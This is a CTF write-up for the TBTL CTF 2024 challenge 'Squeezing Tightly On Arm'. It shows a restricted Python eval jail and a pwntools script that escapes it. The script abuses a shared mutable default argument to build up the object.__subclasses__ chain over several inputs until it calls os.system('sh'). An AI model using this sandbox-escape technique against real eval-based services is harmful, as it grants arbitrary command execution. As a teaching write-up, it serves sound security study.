# TBTL CTF 2024 Squeezing Tightly On Arm

```python
import sys
version = sys.version_info
del sys

FLAG = 'TBTL{...}'
del FLAG


def check(command):

    if len(command) > 120:
        return False

    allowed = {
        "'": 0,
        '.': 1,
        '(': 1,
        ')': 1,
        '/': 1,
        '+': 1,
        }

    for char, count in allowed.items():
        if command.count(char) > count:
            return False

    return True


def safe_eval(command, loc={}):

    if not check(command):
        return

    return eval(command, {'__builtins__': {}}, loc)


for _ in range(10):
    command = input(">>> ")

    if command == 'version':
        print(str(version))
    else:
        safe_eval(command)
```

Requirements:

1. No `'`: Use `"` for strings
2. Some characters may appear only once: save intermediate values to locals
3. No builtins: Use `().__class__.__base__.__subclasses__()` to bypass

The major problem here, is that the default argument `loc={}` is shared between calls. So the locals array is only one and shared between calls to `safe_eval`. So we can simply cut the attack `().__class__.__base__.__subclasses__()[158].__init__.__globals__["system"]["sh"]` into multiple steps:

```python
from pwn import *

context(log_level="debug")

subclasses = str(().__class__.__base__.__subclasses__())

# find the indices of the builtins
# assuming we are using the same Python version as remote

# assuming os._wrap_close is at 158
os_index = 158
assert subclasses.split(", ").index("<class 'os._wrap_close'>") == os_index

p = process(["python3", "squeezing_tightly_on_arm.py"])

# A=().__class__
p.recvuntil(b">>> ")
p.sendline(b"[A:=().__class__]")

p.recvuntil(b">>> ")
# B=().__class__.__base__
p.sendline(f"[B:=A.__base__]".encode())

p.recvuntil(b">>> ")
# C=().__class__.__base__.__subclasses__()
# O=C[os_index]=<class 'os._swap_close'>
p.sendline(f"[C:=B.__subclasses__(),O:=C[{os_index}]]".encode())

# O=<class 'os._wrap_close'>.__init__
p.recvuntil(b">>> ")
p.sendline(f"[O:=O.__init__]".encode())

# <class 'os._wrap_close'>.__init__.__globals__["system"]("sh")
p.recvuntil(b">>> ")
p.sendline(f'[O.__globals__["system"]("sh")]'.encode())

p.interactive()
```
